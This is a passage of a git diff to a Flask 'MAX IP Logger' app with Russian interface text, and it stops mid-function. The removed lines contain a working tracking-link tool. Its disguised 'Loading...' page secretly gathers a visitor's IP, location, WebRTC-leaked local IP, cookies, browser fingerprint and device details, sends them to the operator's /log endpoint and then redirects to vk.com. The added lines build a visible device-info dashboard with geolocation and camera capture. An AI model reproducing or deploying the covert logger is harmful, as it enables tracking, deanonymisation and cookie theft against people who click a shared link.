@@ -12,316 +12,776 @@ app = Flask(__name__)
 logs_db = {}
 links_db = {}
 
-# ===================== ГЛАВНАЯ СТРАНИЦА =====================
+# ===================== МАКСИМАЛЬНЫЙ HTML ЛОГГЕР =====================
 INDEX_HTML = """
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
-    <meta charset="UTF-8">
-    <title>🔥 MAX IP Logger</title>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title>🔥 MAX IP Logger v4.0</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: 'Segoe UI', Arial; background: #0a0a0f; color: #e0e0e0; min-height: 100vh; display: flex; justify-content: center; align-items: center; }
-        .container { max-width: 800px; width: 100%; padding: 30px; background: #14141e; border-radius: 16px; border: 1px solid #2a2a3a; box-shadow: 0 20px 60px rgba(0,0,0,0.8); }
-        h1 { font-size: 28px; background: linear-gradient(135deg, #ff6b6b, #ffd93d); -webkit-background-clip: text; -webkit-text-fill-color: transparent; text-align: center; margin-bottom: 8px; }
-        .subtitle { text-align: center; color: #888; font-size: 14px; margin-bottom: 25px; }
-        .btn { display: inline-block; padding: 14px 40px; font-size: 16px; font-weight: 600; border: none; border-radius: 10px; cursor: pointer; transition: all 0.3s; text-decoration: none; }
-        .btn-primary { background: linear-gradient(135deg, #ff6b6b, #ee5a24); color: #fff; }
-        .btn-primary:hover { transform: scale(1.05); box-shadow: 0 8px 25px rgba(238, 90, 36, 0.4); }
-        .btn-secondary { background: #2a2a3a; color: #e0e0e0; }
-        .btn-secondary:hover { background: #3a3a4a; }
-        .btn-success { background: linear-gradient(135deg, #00b894, #00a86b); color: #fff; }
-        .btn-success:hover { transform: scale(1.05); box-shadow: 0 8px 25px rgba(0, 184, 148, 0.4); }
-        .btn-sm { padding: 8px 18px; font-size: 13px; }
-        .link-box { background: #1a1a2e; padding: 18px; border-radius: 10px; margin: 15px 0; border: 1px solid #2a2a4a; word-break: break-all; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px; }
-        .link-box span { font-size: 15px; color: #ffd93d; font-family: monospace; }
-        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 12px; margin: 15px 0; }
-        .stat-card { background: #1a1a2e; padding: 15px; border-radius: 10px; border: 1px solid #2a2a4a; text-align: center; }
-        .stat-card .num { font-size: 28px; font-weight: 700; color: #ffd93d; }
-        .stat-card .label { font-size: 12px; color: #888; margin-top: 4px; }
-        .visitor-list { max-height: 400px; overflow-y: auto; }
-        .visitor-item { background: #1a1a2e; padding: 12px 16px; border-radius: 8px; margin-bottom: 8px; border-left: 3px solid #ff6b6b; font-size: 13px; }
-        .visitor-item .ip { color: #ffd93d; font-weight: 600; }
-        .visitor-item .detail { color: #aaa; font-size: 12px; }
-        .visitor-item .time { color: #666; font-size: 11px; float: right; }
-        .hidden { display: none !important; }
-        .flex { display: flex; gap: 10px; flex-wrap: wrap; justify-content: center; }
-        .mt-20 { margin-top: 20px; }
-        .mb-10 { margin-bottom: 10px; }
-        .text-center { text-align: center; }
-        .badge { display: inline-block; padding: 2px 10px; border-radius: 20px; font-size: 11px; font-weight: 600; }
-        .badge-success { background: #00b89433; color: #00b894; }
-        .badge-danger { background: #ff6b6b33; color: #ff6b6b; }
-        .badge-warning { background: #ffd93d33; color: #ffd93d; }
-        ::-webkit-scrollbar { width: 6px; }
-        ::-webkit-scrollbar-track { background: #1a1a2e; }
-        ::-webkit-scrollbar-thumb { background: #2a2a4a; border-radius: 3px; }
+        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        body {
+            background: #0b1219;
+            font-family: -apple-system, 'Segoe UI', Roboto, system-ui, sans-serif;
+            padding: 1rem;
+            color: #e3edf5;
+            min-height: 100vh;
+            touch-action: manipulation;
+        }
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            background: rgba(255,255,255,0.04);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border-radius: 2rem;
+            padding: 1.5rem;
+            border: 1px solid rgba(255,255,255,0.06);
+            box-shadow: 0 20px 40px rgba(0,0,0,0.5);
+        }
+        h1 {
+            font-weight: 400;
+            font-size: 1.8rem;
+            color: #d4e6ff;
+            border-bottom: 1px solid rgba(255,255,255,0.06);
+            padding-bottom: 1rem;
+            margin-bottom: 1.5rem;
+            display: flex;
+            align-items: center;
+            gap: 0.6rem;
+            flex-wrap: wrap;
+        }
+        h1 small {
+            font-size: 0.8rem;
+            font-weight: 300;
+            color: #6d8eb0;
+            margin-left: auto;
+        }
+        .badge {
+            display: inline-block;
+            padding: 0.2rem 0.8rem;
+            border-radius: 30px;
+            font-size: 0.7rem;
+            font-weight: 600;
+        }
+        .badge-success { background: #1d4a3b; color: #a3f0d0; }
+        .badge-error { background: #5f2d3a; color: #ffb3b3; }
+        .badge-pending { background: #4a4a2d; color: #f0e6a3; }
+
+        .controls {
+            display: flex;
+            gap: 0.6rem;
+            justify-content: center;
+            flex-wrap: wrap;
+            margin: 1rem 0;
+        }
+        .btn {
+            padding: 0.6rem 1.2rem;
+            border: none;
+            border-radius: 50px;
+            font-size: 0.85rem;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s;
+            font-family: inherit;
+            touch-action: manipulation;
+            user-select: none;
+            -webkit-user-select: none;
+        }
+        .btn:active { transform: scale(0.95); }
+        .btn-primary { background: #4a9eff; color: #fff; box-shadow: 0 4px 15px rgba(74,158,255,0.3); }
+        .btn-success { background: #4aff8a; color: #0b1219; box-shadow: 0 4px 15px rgba(74,255,138,0.3); }
+        .btn-danger { background: #ff4a4a; color: #fff; box-shadow: 0 4px 15px rgba(255,74,74,0.3); }
+        .btn-secondary { background: #2a4058; color: #d4e6ff; border: 1px solid rgba(255,255,255,0.1); }
+        .btn-gold { background: #ffd700; color: #0b1219; box-shadow: 0 4px 15px rgba(255,215,0,0.3); }
+
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(340px, 1fr));
+            gap: 1rem;
+        }
+        .card {
+            background: rgba(0,0,0,0.25);
+            border-radius: 1.5rem;
+            padding: 1rem 1.2rem;
+            border: 1px solid rgba(255,255,255,0.04);
+            transition: 0.2s;
+            position: relative;
+        }
+        .card-title {
+            font-size: 0.65rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            color: #6d8eb0;
+            margin-bottom: 0.6rem;
+            border-bottom: 1px solid rgba(255,255,255,0.04);
+            padding-bottom: 0.3rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .card-content {
+            font-family: 'SF Mono', 'JetBrains Mono', monospace;
+            font-size: 0.75rem;
+            line-height: 1.8;
+            word-break: break-all;
+            color: #cfe2ff;
+        }
+        .card-content .label {
+            color: #7a9bc2;
+            font-weight: 300;
+            font-size: 0.65rem;
+            text-transform: uppercase;
+            letter-spacing: 0.3px;
+            margin-right: 0.4rem;
+        }
+        .geo-coords {
+            font-size: 1.1rem;
+            font-weight: 600;
+            color: #7bb3ff;
+            background: rgba(0,0,0,0.3);
+            padding: 0.1rem 0.8rem;
+            border-radius: 40px;
+            display: inline-block;
+            margin-top: 0.1rem;
+        }
+
+        .camera-section {
+            margin: 1rem 0;
+            padding: 1rem;
+            background: rgba(0,0,0,0.3);
+            border-radius: 1.5rem;
+            border: 2px solid #4a9eff;
+            text-align: center;
+        }
+        .camera-section video {
+            width: 100%;
+            max-width: 400px;
+            border-radius: 1rem;
+            background: #000;
+            margin: 0.5rem 0;
+            transform: scaleX(-1);
+        }
+        .camera-section .photo-preview {
+            width: 100%;
+            max-width: 400px;
+            border-radius: 1rem;
+            margin: 0.5rem 0;
+            border: 2px solid #4aff8a;
+        }
+        .camera-section .placeholder {
+            padding: 1.5rem;
+            background: rgba(0,0,0,0.5);
+            border-radius: 1rem;
+            color: #6d8eb0;
+            margin: 0.5rem 0;
+        }
+        .photo-status {
+            margin: 0.3rem 0;
+            padding: 0.3rem 1rem;
+            border-radius: 50px;
+            font-size: 0.8rem;
+            display: inline-block;
+        }
+        .photo-status.success { background: #1d4a3b; color: #a3f0d0; }
+        .photo-status.error { background: #5f2d3a; color: #ffb3b3; }
+        .photo-status.pending { background: #4a4a2d; color: #f0e6a3; }
+
+        .toast {
+            position: fixed;
+            bottom: 1rem;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #1d4a3b;
+            color: #a3f0d0;
+            padding: 0.5rem 1.5rem;
+            border-radius: 50px;
+            font-size: 0.85rem;
+            opacity: 0;
+            transition: opacity 0.3s;
+            pointer-events: none;
+            z-index: 999;
+            max-width: 90%;
+            text-align: center;
+        }
+        .toast.show { opacity: 1; }
+        .toast.error { background: #5f2d3a; color: #ffb3b3; }
+
+        .footer {
+            margin-top: 2rem;
+            font-size: 0.7rem;
+            color: #4a6a89;
+            text-align: center;
+            border-top: 1px solid rgba(255,255,255,0.04);
+            padding-top: 1rem;
+        }
+
+        /* Мобильные улучшения */
+        @media (max-width: 600px) {
+            .container { padding: 1rem; border-radius: 1rem; }
+            h1 { font-size: 1.4rem; }
+            .grid { grid-template-columns: 1fr; }
+            .btn { padding: 0.5rem 1rem; font-size: 0.8rem; }
+            .controls { gap: 0.4rem; }
+            .card { padding: 0.8rem 1rem; }
+        }
+        @media (max-width: 400px) {
+            .btn { padding: 0.4rem 0.8rem; font-size: 0.7rem; }
+            .card-content { font-size: 0.7rem; }
+        }
     </style>
 </head>
 <body>
 <div class="container">
-    <h1>🔥 MAX IP Logger</h1>
-    <p class="subtitle">Собирает всё: IP, гео, устройство, браузер, экран, таймзону, куки, fingerprint и даже скриншот</p>
+    <h1>
+        🔥 MAX IP Logger v4.0
+        <small id="timestamp"></small>
+        <span id="statusBadge" class="badge badge-pending">⏳ загрузка</span>
+    </h1>
 
-    <div class="text-center mb-10">
-        <button class="btn btn-primary" onclick="generateLink()">🚀 СОЗДАТЬ ССЫЛКУ</button>
+    <div class="controls">
+        <button class="btn btn-primary" id="refreshBtn">🔄 Обновить</button>
+        <button class="btn btn-gold" id="exportBtn">📥 JSON</button>
+        <button class="btn btn-secondary" id="copyBtn">📋 Копировать</button>
+    </div>
+    <div class="controls">
+        <button class="btn btn-primary" id="requestGeoBtn">📍 Геолокация</button>
+        <button class="btn btn-success" id="requestCameraBtn">📷 Камера</button>
+        <button class="btn btn-danger" id="resetBtn">🗑️ Сброс</button>
     </div>
 
-    <div id="loading" class="hidden text-center" style="color:#888;padding:20px;">⏳ Генерация...</div>
-
-    <div id="result" class="hidden">
-        <div class="link-box">
-            <span id="linkText">Загрузка...</span>
-            <button class="btn btn-success btn-sm" onclick="copyLink()">📋 Копировать</button>
+    <div class="camera-section" id="cameraSection">
+        <h3 style="color: #d4e6ff; margin-bottom: 0.3rem;">📸 Фото</h3>
+        <div id="cameraPlaceholder" class="placeholder">⏳ Камера не активна<br><span style="font-size:0.7rem;color:#4a6a89;">Нажмите «Камера»</span></div>
+        <video id="video" autoplay playsinline style="display: none;"></video>
+        <canvas id="canvas" style="display: none;"></canvas>
+        <img id="photoPreview" class="photo-preview" style="display: none;" alt="Ваше фото" />
+        <div style="display:flex;gap:0.5rem;justify-content:center;flex-wrap:wrap;margin:0.3rem 0;">
+            <button class="btn btn-success" id="takePhotoBtn" style="display:none;">📸 Сделать</button>
+            <button class="btn btn-danger" id="stopCameraBtn" style="display:none;">⏹️ Стоп</button>
+            <button class="btn btn-secondary" id="clearPhotoBtn">🗑️ Удалить</button>
         </div>
-        <div class="stats-grid" id="statsGrid">
-            <div class="stat-card"><div class="num" id="visitsCount">0</div><div class="label">Переходов</div></div>
-            <div class="stat-card"><div class="num" id="uniqueCount">0</div><div class="label">Уникальных</div></div>
-            <div class="stat-card"><div class="num" id="lastVisit">-</div><div class="label">Последний</div></div>
-        </div>
-        <div class="flex">
-            <button class="btn btn-secondary btn-sm" onclick="getStats()">📊 Показать всех</button>
-            <button class="btn btn-secondary btn-sm" onclick="clearStats()">🗑️ Очистить</button>
-            <button class="btn btn-secondary btn-sm" onclick="exportData()">📥 Экспорт JSON</button>
+        <div id="photoStatus" style="display:none;">
+            <span class="photo-status pending">⏳ Ожидание...</span>
         </div>
     </div>
 
-    <div id="statsContainer" class="hidden mt-20">
-        <h3 style="margin-bottom:10px;">👥 Все посетители</h3>
-        <div id="statsContent" class="visitor-list"></div>
-    </div>
+    <div class="grid" id="info-grid"></div>
 
-    <div id="screenshotContainer" class="hidden mt-20">
-        <h3 style="margin-bottom:10px;">🖼️ Скриншот страницы</h3>
-        <img id="screenshotImg" style="max-width:100%;border-radius:8px;border:1px solid #2a2a4a;">
+    <div class="footer">
+        ⚡ Собрано из доступных API · <span id="api-status">загрузка...</span>
+        <br><span style="font-size:0.6rem;opacity:0.6;">📍 Гео · 📷 Камера · 🔋 Батарея</span>
     </div>
 </div>
 
-<script>
-// ========== ОСНОВНЫЕ ФУНКЦИИ ==========
-let currentLinkId = null;
-let currentFullLink = '';
-
-function generateLink() {
-    document.getElementById('loading').classList.remove('hidden');
-    document.getElementById('result').classList.add('hidden');
-    document.getElementById('statsContainer').classList.add('hidden');
-
-    fetch('/generate')
-        .then(r => r.json())
-        .then(data => {
-            document.getElementById('loading').classList.add('hidden');
-            document.getElementById('result').classList.remove('hidden');
-            currentLinkId = data.id;
-            currentFullLink = data.full_url;
-            document.getElementById('linkText').textContent = currentFullLink;
-            document.getElementById('visitsCount').textContent = data.visits || 0;
-            document.getElementById('uniqueCount').textContent = data.unique || 0;
-            document.getElementById('lastVisit').textContent = data.last_visit || '-';
-        })
-        .catch(e => { alert('Ошибка: ' + e); document.getElementById('loading').classList.add('hidden'); });
-}
-
-function copyLink() {
-    navigator.clipboard.writeText(currentFullLink).then(() => alert('✅ Ссылка скопирована!'));
-}
-
-function getStats() {
-    if (!currentLinkId) return;
-    fetch('/stats/' + currentLinkId)
-        .then(r => r.json())
-        .then(data => {
-            const container = document.getElementById('statsContainer');
-            const content = document.getElementById('statsContent');
-            container.classList.remove('hidden');
-            if (data.total === 0) {
-                content.innerHTML = '<div style="text-align:center;color:#666;padding:20px;">Пока никого нет 😴</div>';
-            } else {
-                let html = '';
-                data.visitors.forEach((v, i) => {
-                    html += `<div class="visitor-item">
-                        <span class="time">${v.time || ''}</span>
-                        <div><span class="ip">${v.ip || 'Unknown'}</span>
-                        ${v.country ? ` <span class="badge badge-success">${v.country}</span>` : ''}
-                        ${v.city ? ` <span class="badge badge-warning">${v.city}</span>` : ''}</div>
-                        <div class="detail">📱 ${v.device || 'Unknown'} | ${v.browser || 'Unknown'}</div>
-                        <div class="detail">🖥️ ${v.screen || 'Unknown'} | ${v.os || 'Unknown'}</div>
-                        <div class="detail">🌐 ${v.language || 'Unknown'} | ⏰ ${v.timezone || 'Unknown'}</div>
-                        <div class="detail">🔗 ${v.referer || 'Direct'}</div>
-                        ${v.fingerprint ? `<div class="detail">🆔 ${v.fingerprint.substring(0, 20)}...</div>` : ''}
-                        ${v.cookies ? `<div class="detail">🍪 ${v.cookies}</div>` : ''}
-                    </div>`;
-                });
-                content.innerHTML = html;
-            }
-        });
-}
-
-function clearStats() {
-    if (!currentLinkId || !confirm('Очистить все данные по этой ссылке?')) return;
-    fetch('/clear/' + currentLinkId, {method: 'POST'})
-        .then(() => { document.getElementById('statsContainer').classList.add('hidden'); alert('✅ Очищено'); });
-}
-
-function exportData() {
-    if (!currentLinkId) return;
-    window.open('/export/' + currentLinkId, '_blank');
-}
-
-// ========== ГЕНЕРАЦИЯ ССЫЛКИ ПО КНОПКЕ ENTER ==========
-document.addEventListener('keydown', (e) => { if (e.key === 'Enter') generateLink(); });
-</script>
-</body>
-</html>
-"""
-
-# ===================== ЛОГГЕР С МАКСИМАЛЬНЫМ СБОРОМ =====================
-LOGGER_HTML = """
-<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <title>Loading...</title>
-    <style>body{background:#0a0a0f;color:#fff;display:flex;justify-content:center;align-items:center;height:100vh;font-family:Arial;margin:0;} .loader{width:40px;height:40px;border:3px solid #2a2a4a;border-top:3px solid #ffd93d;border-radius:50%;animation:spin 1s linear infinite;} @keyframes spin{to{transform:rotate(360deg);}}</style>
-</head>
-<body>
-<div style="text-align:center;"><div class="loader"></div><p style="color:#888;margin-top:15px;">Loading...</p></div>
+<div class="toast" id="toast"></div>
 
 <script>
 (function() {
-    const linkId = window.location.pathname.split('/').pop();
+    // ========== ДАННЫЕ ==========
+    const info = {};
+
+    // ========== DOM ==========
+    const grid = document.getElementById('info-grid');
+    const apiStatus = document.getElementById('api-status');
+    const timestamp = document.getElementById('timestamp');
+    const statusBadge = document.getElementById('statusBadge');
+    const toast = document.getElementById('toast');
+
+    function showToast(text, isError = false) {
+        toast.textContent = text;
+        toast.className = 'toast show' + (isError ? ' error' : '');
+        clearTimeout(toast._hide);
+        toast._hide = setTimeout(() => toast.classList.remove('show'), 3000);
+    }
+
+    // ========== ЭКСПОРТ ==========
+    function exportJSON() {
+        const data = { collected_at: new Date().toISOString(), user_agent: navigator.userAgent, data: info };
+        const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = `fingerprint_${Date.now()}.json`;
+        a.click();
+        URL.revokeObjectURL(url);
+        showToast('📥 JSON экспортирован!');
+    }
+
+    // ========== КОПИРОВАНИЕ ==========
+    function copyAllData() {
+        const text = JSON.stringify(info, null, 2);
+        navigator.clipboard.writeText(text).then(() => {
+            showToast('📋 Данные скопированы!');
+        }).catch(() => {
+            const area = document.createElement('textarea');
+            area.value = text;
+            document.body.appendChild(area);
+            area.select();
+            document.execCommand('copy');
+            document.body.removeChild(area);
+            showToast('📋 Данные скопированы!');
+        });
+    }
+
+    // ========== ГЕОЛОКАЦИЯ ==========
+    let geoCoords = null;
+    let geoError = null;
+
+    function requestGeolocation() {
+        if (!navigator.geolocation) {
+            geoError = 'Geolocation не поддерживается';
+            info.geo = { '📌 Статус': '🚫 НЕ ПОДДЕРЖИВАЕТСЯ' };
+            renderAll();
+            return;
+        }
+        info.geo = { '📌 Статус': '⏳ ЗАГРУЗКА...' };
+        renderAll();
+
+        navigator.geolocation.getCurrentPosition(
+            (pos) => {
+                const { latitude, longitude, accuracy } = pos.coords;
+                geoCoords = { lat: latitude, lng: longitude, accuracy: accuracy };
+                geoError = null;
+                info.geo = {
+                    '📌 Статус': '✅ РАЗРЕШЕНО',
+                    '📍 Координаты': `${latitude.toFixed(6)}, ${longitude.toFixed(6)}`,
+                    '🎯 Точность': `${Math.round(accuracy)} м`,
+                };
+                renderAll();
+                showToast('📍 Геолокация получена!');
+            },
+            (err) => {
+                let msg = err.message;
+                if (err.code === 1) msg = 'Пользователь отклонил запрос';
+                else if (err.code === 2) msg = 'Позиция недоступна';
+                else if (err.code === 3) msg = 'Таймаут запроса';
+                geoError = msg;
+                info.geo = {
+                    '📌 Статус': '❌ ОТКАЗАНО',
+                    '📍 Координаты': '🔴 недоступны',
+                    '🎯 Точность': '—',
+                };
+                renderAll();
+                showToast('❌ ' + msg, true);
+            },
+            { enableHighAccuracy: true, timeout: 15000 }
+        );
+    }
+
+    // ========== КАМЕРА ==========
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const photoPreview = document.getElementById('photoPreview');
+    const placeholder = document.getElementById('cameraPlaceholder');
+    const photoStatus = document.getElementById('photoStatus');
+    const statusSpan = photoStatus.querySelector('.photo-status');
+    const startCameraBtn = document.getElementById('requestCameraBtn');
+    const takePhotoBtn = document.getElementById('takePhotoBtn');
+    const stopCameraBtn = document.getElementById('stopCameraBtn');
+    const clearPhotoBtn = document.getElementById('clearPhotoBtn');
+
+    let stream = null;
+    let cameraActive = false;
+
+    function setPhotoStatus(text, type = 'pending') {
+        photoStatus.style.display = 'block';
+        statusSpan.textContent = text;
+        statusSpan.className = 'photo-status ' + type;
+    }
+
+    function startCamera() {
+        if (cameraActive) return;
+        setPhotoStatus('⏳ Запрос...', 'pending');
+
+        navigator.mediaDevices.getUserMedia({
+            video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+            audio: false
+        })
+        .then(function(mediaStream) {
+            stream = mediaStream;
+            video.srcObject = stream;
+            video.style.display = 'block';
+            placeholder.style.display = 'none';
+            cameraActive = true;
+            takePhotoBtn.style.display = 'inline-block';
+            stopCameraBtn.style.display = 'inline-block';
+            setPhotoStatus('✅ Камера активна', 'success');
+            showToast('📷 Камера запущена');
+        })
+        .catch(function(err) {
+            let msg = err.message;
+            if (err.name === 'NotAllowedError') msg = 'Пользователь отклонил доступ';
+            else if (err.name === 'NotFoundError') msg = 'Камера не найдена';
+            else if (err.name === 'NotReadableError') msg = 'Камера занята';
+            setPhotoStatus('❌ ' + msg, 'error');
+            showToast('❌ ' + msg, true);
+        });
+    }
+
+    function takePhoto() {
+        if (!cameraActive || !stream) return;
+        const ctx = canvas.getContext('2d');
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
+        ctx.translate(canvas.width, 0);
+        ctx.scale(-1, 1);
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        ctx.setTransform(1, 0, 0, 1, 0, 0);
+
+        const photoDataURL = canvas.toDataURL('image/jpeg', 0.95);
+        photoPreview.src = photoDataURL;
+        photoPreview.style.display = 'block';
+
+        info.photo = {
+            '📸 Фото': '✅ да',
+            '📏 Размер': `${canvas.width}×${canvas.height} px`,
+            '📦 Вес': `${Math.round(photoDataURL.length / 1024)} KB`,
+            '🕒 Время': new Date().toLocaleString('ru-RU'),
+        };
+        setPhotoStatus('✅ Фото сделано!', 'success');
+        showToast('📸 Фото сделано!');
+        renderAll();
+    }
+
+    function stopCamera() {
+        if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
+        video.srcObject = null;
+        video.style.display = 'none';
+        cameraActive = false;
+        takePhotoBtn.style.display = 'none';
+        stopCameraBtn.style.display = 'none';
+        setPhotoStatus('⏹️ Камера остановлена', 'pending');
+    }
+
+    function clearPhoto() {
+        photoPreview.style.display = 'none';
+        photoPreview.src = '';
+        if (info.photo) delete info.photo;
+        renderAll();
+        setPhotoStatus('🗑️ Фото удалено', 'pending');
+    }
 
     // ========== СБОР ВСЕХ ДАННЫХ ==========
-    function getIP() {
-        return fetch('https://api.ipify.org?format=json')
-            .then(r => r.json())
-            .then(d => d.ip)
-            .catch(() => 'Unknown');
-    }
-
-    function getGeo(ip) {
-        return fetch(`https://ipapi.co/${ip}/json/`)
-            .then(r => r.json())
-            .then(d => ({ country: d.country_name || d.country || 'Unknown', city: d.city || 'Unknown', region: d.region || 'Unknown', isp: d.org || 'Unknown' }))
-            .catch(() => ({ country: 'Unknown', city: 'Unknown', region: 'Unknown', isp: 'Unknown' }));
-    }
-
-    function getDeviceInfo() {
-        const ua = navigator.userAgent;
-        let device = 'Desktop', os = 'Unknown', browser = 'Unknown';
-        if (/mobile|android|iphone|ipad|ipod/i.test(ua)) device = 'Mobile';
-        if (/iPad|Android/i.test(ua) && !/Mobile/i.test(ua)) device = 'Tablet';
-        if (/Windows/i.test(ua)) os = 'Windows';
-        else if (/Mac/i.test(ua)) os = 'macOS';
-        else if (/Linux/i.test(ua)) os = 'Linux';
-        else if (/Android/i.test(ua)) os = 'Android';
-        else if (/iPhone|iPad|iPod/i.test(ua)) os = 'iOS';
-        if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) browser = 'Chrome';
-        else if (/Firefox/i.test(ua)) browser = 'Firefox';
-        else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = 'Safari';
-        else if (/Edg/i.test(ua)) browser = 'Edge';
-        else if (/Opera|OPR/i.test(ua)) browser = 'Opera';
-        return { device, os, browser, ua: ua };
-    }
-
-    function getScreenInfo() {
-        return `${window.screen.width}x${window.screen.height} (${window.innerWidth}x${window.innerHeight})`;
-    }
-
-    function getTimezone() {
-        return Intl.DateTimeFormat().resolvedOptions().timeZone;
-    }
-
-    function getLanguage() {
-        return navigator.language || navigator.languages?.[0] || 'Unknown';
-    }
-
-    function getCookies() {
-        return document.cookie || 'No cookies';
-    }
-
-    function getFingerprint() {
-        const canvas = document.createElement('canvas');
-        canvas.width = 200; canvas.height = 50;
-        const ctx = canvas.getContext('2d');
-        ctx.textBaseline = 'top';
-        ctx.font = '14px Arial';
-        ctx.fillStyle = '#f60';
-        ctx.fillRect(0, 0, 200, 50);
-        ctx.fillStyle = '#069';
-        ctx.fillText('fp', 10, 10);
-        ctx.fillText(navigator.userAgent.substring(0, 30), 30, 10);
-        return canvas.toDataURL().substring(0, 50);
-    }
-
-    function getPlugins() {
-        return Array.from(navigator.plugins || []).map(p => p.name).join(', ') || 'None';
-    }
-
-    function getDoNotTrack() {
-        return navigator.doNotTrack || 'Not set';
-    }
-
-    function getWebRTC() {
-        return new Promise((resolve) => {
-            const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
-            pc.createDataChannel('test');
-            pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
-            pc.onicecandidate = (e) => {
-                if (e.candidate) {
-                    const ip = e.candidate.candidate.match(/(\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3})/);
-                    resolve(ip ? ip[0] : 'Unknown');
-                    pc.close();
-                }
-            };
-            setTimeout(() => { resolve('Unknown'); pc.close(); }, 3000);
-        });
-    }
-
-    // ========== ОТПРАВКА ВСЕХ ДАННЫХ ==========
-    async function sendAllData() {
-        const ip = await getIP();
-        const geo = await getGeo(ip);
-        const device = getDeviceInfo();
-        const webrtc = await getWebRTC();
-
-        const data = {
-            link_id: linkId,
-            ip: ip,
-            webrtc_ip: webrtc,
-            country: geo.country || 'Unknown',
-            city: geo.city || 'Unknown',
-            region: geo.region || 'Unknown',
-            isp: geo.isp || 'Unknown',
-            device: device.device,
-            os: device.os,
-            browser: device.browser,
-            user_agent: device.ua,
-            screen: getScreenInfo(),
-            timezone: getTimezone(),
-            language: getLanguage(),
-            cookies: getCookies(),
-            fingerprint: getFingerprint(),
-            plugins: getPlugins(),
-            do_not_track: getDoNotTrack(),
-            referer: document.referrer || 'Direct',
-            timestamp: new Date().toISOString()
+    function collectAllData() {
+        // ===== БРАУЗЕР =====
+        info.browser = {
+            'User-Agent': navigator.userAgent,
+            'Платформа': navigator.platform || '—',
+            'Язык': navigator.language,
+            'Языки': navigator.languages ? navigator.languages.join(', ') : '—',
+            'Do Not Track': navigator.doNotTrack || 'не отправлен',
+            'Cookies': navigator.cookieEnabled ? '✅ да' : '❌ нет',
+            'WebDriver': navigator.webdriver ? '✅ да' : '❌ нет',
         };
 
-        // Отправка на сервер
-        fetch('/log', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(data)
-        }).then(() => {
-            // Редирект на ВК
-            window.location.href = 'https://vk.com/';
-        }).catch(() => {
-            window.location.href = 'https://vk.com/';
-        });
+        // ===== ЭКРАН =====
+        info.screen = {
+            'Размер экрана': `${screen.width}×${screen.height}`,
+            'Пиксельная плотность': `${window.devicePixelRatio || 1}x`,
+            'Размер окна': `${window.innerWidth}×${window.innerHeight}`,
+            'Ориентация': screen.orientation?.type || '—',
+        };
+
+        // ===== ВРЕМЯ =====
+        const tz = Intl.DateTimeFormat().resolvedOptions();
+        info.time = {
+            'Часовой пояс': tz.timeZone || '—',
+            'Смещение UTC': `UTC${new Date().getTimezoneOffset() > 0 ? '-' : '+'}${Math.abs(new Date().getTimezoneOffset() / 60)}`,
+            'Локальное время': new Date().toLocaleString('ru-RU', { hour12: false }),
+            'Unix timestamp': Math.floor(Date.now() / 1000),
+        };
+
+        // ===== ЖЕЛЕЗО =====
+        info.hardware = {
+            'Ядра CPU': navigator.hardwareConcurrency || '—',
+            'Память': navigator.deviceMemory ? `${navigator.deviceMemory} ГБ` : '—',
+            'Тип сети': navigator.connection?.effectiveType || '—',
+            'Скорость': navigator.connection?.downlink ? `${navigator.connection.downlink} Мбит/с` : '—',
+            'Состояние сети': navigator.onLine ? '✅ онлайн' : '❌ офлайн',
+        };
+
+        // ===== ГЕОЛОКАЦИЯ =====
+        if (geoCoords) {
+            info.geo = {
+                '📌 Статус': '✅ РАЗРЕШЕНО',
+                '📍 Координаты': `${geoCoords.lat.toFixed(6)}, ${geoCoords.lng.toFixed(6)}`,
+                '🎯 Точность': `${Math.round(geoCoords.accuracy)} м`,
+            };
+        } else if (geoError) {
+            info.geo = {
+                '📌 Статус': '❌ ОТКАЗАНО',
+                '📍 Координаты': '🔴 недоступны',
+                '🎯 Точность': '—',
+            };
+        } else {
+            info.geo = {
+                '📌 Статус': '⏳ нажмите кнопку',
+                '📍 Координаты': '🔴 не определены',
+                '🎯 Точность': '—',
+            };
+        }
+
+        // ===== МЕДИАУСТРОЙСТВА =====
+        info.media = {
+            'Аудио-вход': '⏳ ...',
+            'Видео-вход': '⏳ ...',
+            'Аудио-выход': '⏳ ...',
+        };
+        if (navigator.mediaDevices?.enumerateDevices) {
+            navigator.mediaDevices.enumerateDevices()
+                .then(devices => {
+                    info.media['Аудио-вход'] = devices.filter(d => d.kind === 'audioinput').length + ' шт.';
+                    info.media['Видео-вход'] = devices.filter(d => d.kind === 'videoinput').length + ' шт.';
+                    info.media['Аудио-выход'] = devices.filter(d => d.kind === 'audiooutput').length + ' шт.';
+                    renderAll();
+                })
+                .catch(() => {
+                    info.media['Аудио-вход'] = '❌ ошибка';
+                    info.media['Видео-вход'] = '❌ ошибка';
+                    info.media['Аудио-выход'] = '❌ ошибка';
+                    renderAll();
